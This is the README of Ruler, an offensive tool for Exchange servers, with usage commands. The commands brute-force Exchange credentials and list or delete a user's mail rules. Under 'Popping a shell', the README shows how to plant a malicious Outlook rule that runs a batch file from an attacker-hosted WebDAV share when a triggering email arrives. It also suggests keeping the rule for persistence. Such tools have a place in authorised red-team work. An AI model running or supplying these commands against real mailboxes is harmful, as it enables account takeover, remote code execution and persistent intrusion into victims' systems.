# Introduction

Ruler is a tool that allows you to interact with Exchange servers through the MAPI/HTTP protocol. The main aim is abuse the client-side Outlook mail rules as described in: [Silentbreak blog]

Silentbreak did a great job with this attack and it has served us well. The only downside has been that it takes time to get setup. Cloning a mailbox into a new instance of Outlook can be time consuming. And then there is all the clicking it takes to get a mailrule created. Wouldn't the command line version of this attack be great? And that is how Ruler was born.

The full low-down on how Ruler was implemented and some background regarding MAPI can be found in our blog post: [SensePost blog]

## What does it do?

Ruler has multiple functions and more are planned. These include

* Enumerate valid users
* View currently configured mail rules
* Create new malicious mail rules
* Delete mail rules

Ruler attempts to be semi-smart when it comes to interacting with Exchange and uses the Autodiscover service (just as your Outlook client would) to discover the relevant information.

# Getting the Code

Ruler is written in Go so you'll need to have Go setup to run/build the project
The first step as always is to clone the repo :

```
git clone https://github.com/sensepost/ruler.git
```
Or you can get it through Go:
```
go get https://github.com/sensepost/ruler
```

You can now run the app through ```go run``` if you wish:
```
go run ruler.go -h
```

Or build it (the prefered option):

```
go build
```

# Interacting with Exchange

It is important to note that for now this only works with the newer MAPI/HTTP used for OutlookAnywhere. The older RPC/HTTP which MAPI replaces is not supported and may possibly not be supported.

As mentioned before there are multiple functions to Ruler. In most cases you'll want to first find a set of valid credentials. Do this however you wish, Phishing, Wifi+Mana or brute-force.

## Brute-force for credentials

If you go the brute-force route, Ruler is your friend. It has a built-in brute-forcer which does a semi-decent job of finding creds.

```
./ruler -domain targetdomain.com -brute -usernames /path/to/user.txt -passwords /path/to/passwords.txt
```

There are a few other flags that work with ```-brute```
These are:
* -stop _//stop on the first valid username:password combo_
* -delay _//how long to wait between multiple password guesses_
* -attempts _//how many attempts before we delay (attempts per user)_
* -insecure _//if the Exchange server has a bad SSL cerificate_
* -v      _//be verbose and show failed attempts_

## Display existing rules / verify account

Once you have a set of credentials you can target the user's mailbox. Here you'll need to know their email address (address book searching is in the planned extension).

```
./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -display
```

## Delete existing rules (clean up after  yourself)
To delete rules, use the ruleId displayed next to the rule name (000000df1)

```
./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -delete 000000df1
```

# Popping a shell

Now the fun part. Your initial setup is the same as outlined in the [Silentbreak blog], setup your webdav server to host your payload.

To create the new rule user Ruler and:

```
./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -loc \\\\yourserver\\webdav\\shell.bat -trigger "pop a shell" -rule maliciousrule
```

The various parts:
* `-loc` _this is the location of your remote shell (or c:/Windows/system32/calc.exe)_
* `-trigger` _the string within the subject you want to trigger the rule_
* `-rule` _a name for your rule_

You should now be able to send an email to your target with the trigger string in the subject line. From testing the mailrule is synchronised across nearly instantaniously, so in most cases you should be able to get a shell almost immediatly, assuming outlook is open and connected.

Enjoy your shell and don't forget to clean-up after yourself by deleting the rule (or leave it for persistence).

[Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
[SensePost blog]: <https://sensepost.com/blog/>
